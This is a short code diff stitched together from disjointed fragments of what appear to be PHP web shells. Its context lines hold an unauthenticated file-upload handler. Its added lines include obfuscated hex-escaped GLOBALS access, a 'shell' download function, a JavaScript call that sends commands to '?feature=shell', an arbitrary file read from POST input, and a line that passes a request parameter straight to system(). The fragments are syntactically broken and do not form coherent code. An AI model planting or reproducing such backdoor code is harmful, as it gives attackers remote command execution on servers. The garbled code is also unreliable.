@@ -41,3 +41,9 @@ indexBase64[str.charCodeAt(i++)];
 if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') 
 ;if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
 !preg_match('~^(unsafe_raw)?$~',ini_get("filter.default"));
+=explode(" ",microtime());return((float)${${
+ } } function download_files($dir_name='shell'){ global $_POST,$_GET,$_SERVER;
+echo perms(${${"G\x4cO\x42A\x4c\x53"}
+makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function(response) {
+if(!$file=@fopen($_POST['loc_file'],"r")) { err(1,$_POST['loc_file']); $_POST['cmd']=""; }
+if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd);
